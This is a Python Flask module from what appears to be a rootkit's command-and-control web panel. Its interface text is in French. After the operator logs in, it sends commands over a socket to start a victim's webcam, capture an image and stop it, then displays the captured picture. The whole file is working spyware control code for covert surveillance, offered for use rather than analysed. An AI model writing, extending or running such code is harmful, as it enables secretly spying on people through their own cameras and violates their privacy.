from flask import Blueprint, render_template, request, redirect, url_for
import utils.state as state
import os

webcam_bp = Blueprint('webcam', __name__)

@webcam_bp.route('/', methods=['GET', 'POST'])
def webcam():
    if not state.authenticated:
        return redirect(url_for('auth.login'))

    webcam_output = ""
    image_path = "/var/www/html/images/capture.jpg"

    if request.method == 'POST':
        action = request.form.get('action')

        try:
            with state.connection_lock:
                if state.rootkit_connection:
                    if action == 'start':
                        state.rootkit_connection.sendall(b"start_webcam\n")
                        webcam_output = "✅ Webcam démarrée."
                    elif action == 'capture':
                        state.rootkit_connection.sendall(b"capture_image\n")
                        webcam_output = "📸 Image capturée avec succès."
                    elif action == 'stop':
                        state.rootkit_connection.sendall(b"stop_webcam\n")
                        webcam_output = "🛑 Webcam arrêtée."
                    else:
                        webcam_output = "❌ Action inconnue."
        except Exception as e:
            webcam_output = f"💥 Erreur : {e}"

    image_exists = os.path.exists(image_path)

    return render_template("webcam.html", webcam_output=webcam_output, image_exists=image_exists, image_path=image_path)
